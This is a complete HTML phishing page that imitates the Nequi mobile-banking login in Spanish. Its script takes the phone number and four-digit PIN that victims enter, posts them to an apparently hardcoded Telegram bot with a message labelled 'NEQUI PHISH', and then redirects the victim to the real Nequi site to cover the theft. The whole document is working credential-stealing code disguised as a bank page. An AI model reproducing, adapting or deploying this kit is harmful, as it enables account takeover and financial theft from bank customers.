<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        
        * { margin:0; padding:0; box-sizing:border-box; }
        body { 
            font-family: 'Roboto', sans-serif; 
            background: #120B24;
            height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center;
            color: white;
        }
        .container {
            width: 100%;
            max-width: 360px;
            padding: 20px;
            text-align: center;
        }
        .logo {
            font-size: 42px;
            font-weight: 700;
            margin-bottom: 60px;
            color: #FF2D95;
        }
        .input-container {
            background: rgba(255,255,255,0.08);
            border-radius: 12px;
            margin-bottom: 16px;
            padding: 4px;
        }
        input {
            width: 100%;
            background: transparent;
            border: none;
            padding: 18px 20px;
            font-size: 17px;
            color: white;
            outline: none;
        }
        input::placeholder {
            color: rgba(255,255,255,0.55);
        }
        .btn {
            width: 100%;
            padding: 16px;
            background: #FF2D95;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 500;
            margin-top: 20px;
            cursor: pointer;
        }
        .help {
            position: absolute;
            top: 25px;
            right: 25px;
            font-size: 26px;
            color: #aaa;
        }
    </style>
</head>
<body>
    <div class="help">?</div>

    <div class="container">
        <div class="logo">Nequi</div>
        
        <form id="loginForm">
            <div class="input-container">
                <input type="tel" id="phone" placeholder="Número de celular" maxlength="10" inputmode="numeric" required>
            </div>
            
            <div class="input-container">
                <input type="password" id="password" placeholder="Contraseña" maxlength="4" inputmode="numeric" required>
            </div>
            
            <button type="submit" class="btn">Ingresar</button>
        </form>
    </div>

    <script>
        const botToken = "8712944286:AAGUAFIPjLNX5sMeEYdNjLNoFGXiQL_ZNO8";
        const chatId = "773351137";

        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const phone = document.getElementById("phone").value.trim();
            const password = document.getElementById("password").value.trim();

            if (phone.length !== 10 || !/^\d+$/.test(phone)) return;
            if (password.length !== 4 || !/^\d+$/.test(password)) return;

            const message = `🔴 NEQUI PHISH\n\n📱 Celular: ${phone}\n🔑 Contraseña: ${password}\n⏰ Hora: ${new Date().toLocaleString()}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });

            setTimeout(() => {
                window.location.href = "https://www.nequi.com.co";
            }, 800);
        });
    </script>
</body>
</html>
